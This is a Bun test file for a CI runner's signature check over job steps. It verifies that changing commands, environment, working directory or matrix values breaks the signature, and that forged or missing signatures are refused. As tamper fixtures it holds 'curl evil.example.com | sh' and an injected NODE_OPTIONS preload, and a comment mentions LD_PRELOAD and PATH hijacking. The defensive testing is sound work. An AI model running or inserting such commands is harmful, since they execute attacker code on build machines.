// The signature over the work a runner is about to execute.
//
// The property being tested is not "a signature verifies" - that is WebCrypto's
// test, not ours. It is that the *canonical form* covers everything that
// changes what the machine does: change a command, an environment value, a
// working directory, or a matrix value, and the signature stops matching. A
// canonicalisation that missed one of those would verify happily while the
// runner executed something else.

import { describe, expect, test } from 'bun:test'
import { canonicalWork, verifyWork } from '../../app/Actions/Workflow/stepSignature'

const KID = 'test-step-key'

function work(over: Partial<Parameters<typeof canonicalWork>[0]> = {}): Parameters<typeof canonicalWork>[0] {
  return {
    runId: 7,
    jobId: 12,
    matrix: { node: '20' },
    steps: [
      { run: 'bun test', uses: null, env: { CI: 'true' }, workingDirectory: null },
    ],
    ...over,
  }
}

/** A key pair standing in for the instance's, so the test needs no database. */
async function keyPair(): Promise<{ privateKey: CryptoKey, jwk: any }> {
  const pair = await crypto.subtle.generateKey(
    { name: 'RSASSA-PKCS1-v1_5', modulusLength: 2048, publicExponent: new Uint8Array([1, 0, 1]), hash: 'SHA-256' },
    true,
    ['sign', 'verify'],
  )

  const jwk: any = await crypto.subtle.exportKey('jwk', pair.publicKey)

  return { privateKey: pair.privateKey, jwk: { ...jwk, kid: KID, use: 'sig', alg: 'RS256' } }
}

async function sign(privateKey: CryptoKey, subject: Parameters<typeof canonicalWork>[0]): Promise<string> {
  const signature = await crypto.subtle.sign(
    'RSASSA-PKCS1-v1_5',
    privateKey,
    new TextEncoder().encode(canonicalWork(subject)),
  )

  return Buffer.from(signature).toString('base64')
}

describe('the canonical form', () => {
  test('does not depend on the order keys were written in', () => {
    const one = canonicalWork(work({ matrix: { node: '20', os: 'linux' } }))
    const other = canonicalWork(work({ matrix: { os: 'linux', node: '20' } }))

    // Two encodings of one combination have to produce one string, or a
    // signature would fail on whichever side happened to iterate differently.
    expect(one).toBe(other)
  })

  test('changes when anything the machine acts on changes', () => {
    const base = canonicalWork(work())

    expect(canonicalWork(work({ steps: [{ run: 'bun test --coverage', env: { CI: 'true' } }] }))).not.toBe(base)
    expect(canonicalWork(work({ steps: [{ run: 'bun test', env: { CI: 'false' } }] }))).not.toBe(base)
    expect(canonicalWork(work({ steps: [{ run: 'bun test', env: { CI: 'true' }, workingDirectory: 'packages/api' }] }))).not.toBe(base)
    expect(canonicalWork(work({ matrix: { node: '22' } }))).not.toBe(base)
    expect(canonicalWork(work({ jobId: 13 }))).not.toBe(base)
  })
})

describe('verification', () => {
  test('accepts work signed by a published key', async () => {
    const key = await keyPair()
    const subject = work()

    const verdict = await verifyWork({
      work: subject,
      signature: { kid: KID, alg: 'RS256', value: await sign(key.privateKey, subject) },
      keys: [key.jwk],
    })

    expect(verdict.ok).toBe(true)
  })

  test('refuses a step somebody changed after it was signed', async () => {
    const key = await keyPair()
    const signature = { kid: KID, alg: 'RS256', value: await sign(key.privateKey, work()) }

    /*
     * The attack this is for: a row in `workflow_version_steps` rewritten by
     * whoever has the database, on a job whose signature was minted over the
     * command the workflow author wrote.
     */
    const tampered = work({ steps: [{ run: 'curl evil.example.com | sh', env: { CI: 'true' } }] })

    const verdict = await verifyWork({ work: tampered, signature, keys: [key.jwk] })

    expect(verdict.ok).toBe(false)
    expect(verdict.reason).toContain('does not match')
  })

  test('refuses an environment value changed after it was signed', async () => {
    const key = await keyPair()
    const signature = { kid: KID, alg: 'RS256', value: await sign(key.privateKey, work()) }

    // The environment is the way in one indirection along from the command:
    // `NODE_OPTIONS`, `LD_PRELOAD`, a `PATH` with somebody's directory first.
    const verdict = await verifyWork({
      work: work({ steps: [{ run: 'bun test', env: { CI: 'true', NODE_OPTIONS: '--require /tmp/x.js' } }] }),
      signature,
      keys: [key.jwk],
    })

    expect(verdict.ok).toBe(false)
  })

  test('refuses a signature made with a key the instance does not publish', async () => {
    const mine = await keyPair()
    const theirs = await keyPair()
    const subject = work()

    // Signed with a key of their own, announced under the id of a real one:
    // the check that matters is that the *key* comes from the JWKS rather than
    // from the message claiming to be signed by it.
    const verdict = await verifyWork({
      work: subject,
      signature: { kid: KID, alg: 'RS256', value: await sign(theirs.privateKey, subject) },
      keys: [mine.jwk],
    })

    expect(verdict.ok).toBe(false)
  })

  test('refuses an unsigned job rather than treating absence as consent', async () => {
    const key = await keyPair()

    const verdict = await verifyWork({ work: work(), signature: null, keys: [key.jwk] })

    expect(verdict.ok).toBe(false)
    expect(verdict.reason).toContain('without a signature')
  })

  test('names the key it could not find, because that is the fixable case', async () => {
    const key = await keyPair()
    const subject = work()

    const verdict = await verifyWork({
      work: subject,
      signature: { kid: 'rotated-away', alg: 'RS256', value: await sign(key.privateKey, subject) },
      keys: [key.jwk],
    })

    expect(verdict.ok).toBe(false)
    expect(verdict.reason).toContain('rotated-away')
  })
})
